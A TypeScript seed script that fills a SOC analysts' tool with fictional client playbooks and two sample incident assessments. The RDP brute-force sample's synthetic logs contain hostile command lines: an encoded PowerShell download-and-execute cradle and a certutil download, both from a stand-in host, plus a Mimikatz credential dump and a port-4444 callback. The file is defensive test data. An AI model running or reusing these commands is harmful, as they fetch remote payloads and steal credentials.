// Sample data: two fictional clients' playbooks and two sample assessments
// (First-Seen External IP false positive, RDP brute force). Everything is fictional and uses
// .example domains and documentation IP ranges. Safe to run more than once.
import { Prisma } from "@prisma/client";
import { prisma } from "../src/db.js";

const pad = (n: number) => String(n).padStart(2, "0");

function sampleALogs() {
  const lines: string[] = [];
  const acts = ["close", "accept", "client-rst", "close", "server-rst"];
  let sumS = 0, sumR = 0;
  for (let i = 0; i < 20; i++) {
    const src = i % 2 === 0 || i >= 18 ? "172.20.70.30" : "172.20.70.34";
    let s = 11000 + ((i * 977) % 2000), r = 140000 + ((i * 7919) % 20000);
    if (i === 19) { s = 254351 - sumS; r = 3172542 - sumR; }
    sumS += s; sumR += r;
    const sec = 14 * 60 + 7 + i * 113;
    const t = `09:${pad(Math.floor(sec / 60) % 60)}:${pad(sec % 60)}`;
    lines.push(`date=2026-06-02 time=${Math.floor(sec / 60) >= 60 ? t.replace(/^09/, "10") : t} devname="FGT-NW-HQ01" devid="FG100FTK21000001" tz="+0800" logid="0000000013" type="traffic" subtype="forward" level="notice" vd="root" srcip=${src} srcport=${50112 + i * 7} srcintf="port2" dstip=101.72.194.189 dstport=443 dstintf="wan1" proto=6 action="${acts[i % 5]}" policyid=12 service="HTTPS" sentbyte=${s} rcvdbyte=${r} appcat="unscanned"`);
  }
  return lines.join("\n");
}

function enc16(s: string) { const b = Buffer.alloc(s.length * 2); for (let i = 0; i < s.length; i++) b.writeUInt16LE(s.charCodeAt(i), i * 2); return b.toString("base64"); }
function sampleBLogs() {
  const L: string[] = [];
  for (let i = 0; i < 6; i++) L.push(`2026-06-02T05:0${2 + Math.floor(i / 3)}:${pad(11 + i * 9)}Z host=HL-WS-FIN07 EventID=4625 user=mreyes src_ip=203.0.113.47 LogonType=10 msg="An account failed to log on" FailureReason="Unknown user name or bad password"`);
  const b64 = enc16("IEX (New-Object Net.WebClient).DownloadString('http://dl.update-check.example/a.ps1')");
  L.push(
    `2026-06-02T05:05:40Z host=HL-WS-FIN07 EventID=4624 user=mreyes src_ip=203.0.113.47 LogonType=10 msg="An account was successfully logged on"`,
    `2026-06-02T05:07:02Z host=HL-WS-FIN07 EventID=4688 user=mreyes parent=explorer.exe process=powershell.exe cmd="powershell.exe -nop -w hidden -enc ${b64}"`,
    `2026-06-02T05:07:31Z host=HL-WS-FIN07 EventID=4688 user=mreyes parent=powershell.exe process=certutil.exe cmd="certutil.exe -urlcache -split -f http://dl.update-check.example/payload.bin C:\\Users\\Public\\svchelper.exe"`,
    `2026-06-02T05:08:12Z host=HL-WS-FIN07 EventID=4688 user=mreyes parent=svchelper.exe process=mimikatz.exe cmd="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit" sha256=9f2c4e1ab37d58c06e4f1d2b9a7c3e8f5061d4b2a9e7c3f18d6b5a4e2c1f0d9a`,
    `2026-06-02T05:08:13Z host=HL-WS-FIN07 Defender action=quarantined threat="HackTool:Win64/Mimikatz" file=C:\\Users\\Public\\mimikatz.exe sha256=9f2c4e1ab37d58c06e4f1d2b9a7c3e8f5061d4b2a9e7c3f18d6b5a4e2c1f0d9a`,
    `2026-06-02T05:09:05Z host=HL-WS-FIN07 parent=svchelper.exe srcip=10.40.12.27 dstip=203.0.113.47 dstport=4444 proto=6 action=allowed msg="Outbound connection"`,
  );
  return L.join("\n");
}

const PLAYBOOKS = [
  {
    client: "Northwind Logistics", industry: "Logistics", reviewed: "2026-05-15",
    matrix: [
      { sev: "Critical", contact: "Dana Whitfield (IT Security Lead)", email: "secops@northwind.example", channel: "Phone + email", sla: "15 min" },
      { sev: "High", contact: "Dana Whitfield (IT Security Lead)", email: "secops@northwind.example", channel: "Email + Teams", sla: "1 hour" },
      { sev: "Medium", contact: "IT Service Desk", email: "servicedesk@northwind.example", channel: "Email", sla: "4 hours" },
      { sev: "Low", contact: "IT Service Desk", email: "servicedesk@northwind.example", channel: "Daily summary email", sla: "24 hours" },
    ],
    containment: "SOC may isolate workstations via MDE without approval for Critical alerts. Servers and account disables need approval from Dana Whitfield.",
    procedures: [
      { title: "First-Seen External IP", steps: ["Check the destination owner, ASN and reputation in OSINT.", "Identify the process that made the connection in MDE.", "Check the Known benign list (vendor update CDNs are common).", "If the process is a signed, known agent and reputation is clean, close as NFA.", "Otherwise escalate as Medium and ask the client to confirm."] },
      { title: "Suspicious Scheduled Task", steps: ["Get the task XML and the action binary hash.", "Check whether the creating account is a known admin or service account.", "Escalate as Medium if the binary is unsigned or in ProgramData/Temp."] },
    ],
    contacts: [
      { name: "Dana Whitfield", role: "IT Security Lead", email: "dana.whitfield@northwind.example", phone: "+63 2 8555 0101" },
      { name: "IT Service Desk", role: "24/7 desk", email: "servicedesk@northwind.example", phone: "+63 2 8555 0199" },
    ],
    benign: ["nwupdate.exe vendor agent connecting to Example CDN Networks (AS64500)", "Nightly Veeam backup traffic from 172.20.10.0/24 to 172.20.90.15", "Qualys scanner 172.20.5.40 port scans on Sundays 01:00–04:00"],
  },
  {
    client: "Harbor Lane Bank", industry: "Banking", reviewed: "2026-04-30",
    matrix: [
      { sev: "Critical", contact: "Marco Ilagan (CISO)", email: "csirt@harborlane.example", channel: "Phone bridge + email", sla: "15 min" },
      { sev: "High", contact: "CSIRT on-call", email: "csirt@harborlane.example", channel: "Phone + email", sla: "30 min" },
      { sev: "Medium", contact: "CSIRT queue", email: "csirt@harborlane.example", channel: "Email", sla: "2 hours" },
      { sev: "Low", contact: "CSIRT queue", email: "csirt@harborlane.example", channel: "Weekly report", sla: "7 days" },
    ],
    containment: "SOC must not contain anything without CSIRT approval. Recommend actions only; the client executes containment.",
    procedures: [
      { title: "RDP Brute Force", steps: ["Confirm whether any logon succeeded after the failures.", "If yes, treat as Critical: call the CSIRT on-call before sending the email.", "Pull the process tree for the 30 minutes after the logon.", "List every external IP and hash for the client to block."] },
      { title: "Impossible Travel Sign-in", steps: ["Check both sign-in IPs and the device IDs.", "Ask the CSIRT to confirm travel with the user.", "Recommend session revocation and password reset if not confirmed."] },
    ],
    contacts: [
      { name: "Marco Ilagan", role: "CISO", email: "marco.ilagan@harborlane.example", phone: "+63 2 8555 0201" },
      { name: "CSIRT on-call", role: "24/7", email: "csirt@harborlane.example", phone: "+63 2 8555 0299" },
    ],
    benign: ["Tenable scans from 10.40.1.50", "Branch VPN sign-ins from 198.51.100.0/24 (Harbor Lane ISP)"],
  },
];

const ASSESSMENTS = [
  {
    ticket: "INC-24131", client: "Northwind Logistics", alertName: "First-Seen External IP", rawLogs: sampleALogs(), analystName: "J. Navarro", shift: "Morning",
    findings: "MDE shows both hosts running the vendor update agent (nwupdate.exe) at the time of the connections.\nNo other hosts or users contacted the IP in the last 30 days.",
    verdict: "Likely False Positive", severity: "Low", riskScore: 12, confidence: "High", closure: "Closing as NFA",
    summary: "Two internal hosts made 20 HTTPS connections to external IP 101.72.194.189. Traffic was mostly inbound (downloads) and sessions ended normally.",
    verdictReason: "Traffic matches the vendor update agent downloading packages from a CDN node",
    alertId: "a8f3c2d1-55e0-4b7a-9c1e-2f6d8b4e7a10", rule: "NW - First-Seen External IP Connection",
    ruleLogic: "Fires when an internal host connects to an external IP not seen in the previous 14 days.",
    detSource: "Microsoft Sentinel", category: "Command and Control", alertSeverity: "Medium", status: "New",
    created: "Jun 2, 2026 10:02 (UTC+08:00)", alertWindow: "Jun 2, 2026 09:00 – 10:00 (UTC+08:00)",
    asn: "AS64500", location: "Singapore, SG", ipType: "Hosting / CDN IP, not residential",
    reputation: "AbuseIPDB 0% confidence and VirusTotal 0/94, no malicious reports", logSource: "Fortigate (CommonSecurityLog)",
    edrTelemetry: "nwupdate.exe (signed, Northwind IT) initiated the connections on both hosts",
    extra: { form: { verdict: "Likely False Positive", serviceSource: "Scheduled analytics rule", mitre: "T1071.001 – Application Layer Protocol: Web Protocols", classification: "Undetermined", owner: "Example CDN Networks", defang: true },
      snapshot: { isFP: true, iocs: ["101.72.194.189"], rule: "NW - First-Seen External IP Connection", primary: "101.72.194.189" } },
    createdAt: new Date("2026-06-02T02:20:00Z"), escalatedAt: null as Date | null,
    notes: [
      { type: "Investigation", at: "2026-06-02T02:08:00Z", text: "Reviewed 20 Fortigate traffic lines to 101.72.194.189:443. Two sources: 172.20.70.30 and 172.20.70.34.", authorName: "J. Navarro" },
      { type: "Assessment", at: "2026-06-02T02:18:00Z", text: "MDE ties the connections to nwupdate.exe. Owner Example CDN Networks matches the Known benign list.", authorName: "J. Navarro" },
    ],
  },
  {
    ticket: "INC-24127", client: "Harbor Lane Bank", alertName: "RDP Brute Force Followed by Credential Dumping", rawLogs: sampleBLogs(), analystName: "K. Santos", shift: "Morning",
    findings: "Six failed RDP logons from 203.0.113.47 followed by a successful logon for mreyes.\nEncoded PowerShell launched certutil to download svchelper.exe, which ran Mimikatz.\nDefender quarantined Mimikatz but svchelper.exe opened an outbound session on port 4444. Confirmed malicious.",
    verdict: "True Positive", severity: "Critical", riskScore: 96, confidence: "High", closure: "Escalated to client",
    summary: "Activity on HL-WS-FIN07 by mreyes matched 7 ATT&CK techniques: Brute Force, Valid Accounts, PowerShell, LSASS Memory and more. Security controls blocked part of the activity.",
    verdictReason: "Brute-forced RDP account was used to download tools and dump credentials",
    alertId: "5b1e9a77-0c3d-4f21-8e6b-91d4a2c7f3e5", rule: "HL - RDP Brute Force with Successful Logon",
    ruleLogic: "Fires on 5+ failed RDP logons followed by a success from the same source within 30 minutes.",
    detSource: "Microsoft Defender for Endpoint", category: "Credential Access", alertSeverity: "High", status: "Active",
    created: "Jun 2, 2026 13:10 (UTC+08:00)", alertWindow: "Jun 2, 2026 13:02 – 13:09 (UTC+08:00)",
    asn: "AS64511", location: "Unknown", ipType: "VPS hosting IP", reputation: "AbuseIPDB 100% confidence, 312 reports for RDP brute force",
    logSource: "Windows Security, Defender for Endpoint", edrTelemetry: "Process tree confirms explorer.exe › powershell.exe › certutil.exe › svchelper.exe",
    extra: { form: { verdict: "True Positive", serviceSource: "Microsoft Sentinel", mitre: "T1110 – Brute Force", classification: "True positive", owner: "Example VPS Hosting", defang: true },
      snapshot: { isFP: false, iocs: ["203.0.113.47", "dl.update-check.example", "9f2c4e1ab37d58c06e4f1d2b9a7c3e8f5061d4b2a9e7c3f18d6b5a4e2c1f0d9a", "HL-WS-FIN07"], rule: "HL - RDP Brute Force with Successful Logon", primary: "203.0.113.47" } },
    createdAt: new Date("2026-06-02T05:12:00Z"), escalatedAt: new Date("2026-06-02T05:15:00Z"),
    notes: [
      { type: "Investigation", at: "2026-06-02T05:11:00Z", text: "Brute force from 203.0.113.47 succeeded for mreyes. Encoded PowerShell and certutil download followed.", authorName: "K. Santos" },
      { type: "Client comms", at: "2026-06-02T05:15:00Z", text: "Called CSIRT on-call and sent the escalation email to csirt@harborlane.example.", authorName: "K. Santos" },
      { type: "Containment", at: "2026-06-02T05:22:00Z", text: "CSIRT isolated HL-WS-FIN07 and disabled mreyes.", authorName: "K. Santos" },
    ],
  },
];

async function main() {
  for (const p of PLAYBOOKS) {
    const data = { industry: p.industry, reviewed: p.reviewed, containment: p.containment, matrix: p.matrix as Prisma.InputJsonValue, contacts: p.contacts as Prisma.InputJsonValue, benign: p.benign as Prisma.InputJsonValue, procedures: p.procedures as Prisma.InputJsonValue };
    await prisma.playbook.upsert({ where: { client: p.client }, create: { client: p.client, ...data }, update: data });
  }
  for (const { notes, extra, ...a } of ASSESSMENTS) {
    const data = { ...a, extra: extra as Prisma.InputJsonValue, ...(a.escalatedAt ? { escalationStatus: "Awaiting client", statusLog: [{ status: "Escalated", by: a.analystName, at: a.escalatedAt.toISOString() }] as Prisma.InputJsonValue } : {}) };
    const row = await prisma.assessment.upsert({ where: { client_ticket: { client: a.client, ticket: a.ticket } }, create: data, update: data });
    await prisma.note.deleteMany({ where: { assessmentId: row.id } });
    await prisma.note.createMany({ data: notes.map((n) => ({ assessmentId: row.id, type: n.type, text: n.text, at: new Date(n.at), authorName: n.authorName })) });
  }
  console.log(`Seeded ${PLAYBOOKS.length} playbooks and ${ASSESSMENTS.length} sample assessments (fictional data).`);
}

main().then(() => prisma.$disconnect()).catch(async (e) => { console.error(e); await prisma.$disconnect(); process.exit(1); });
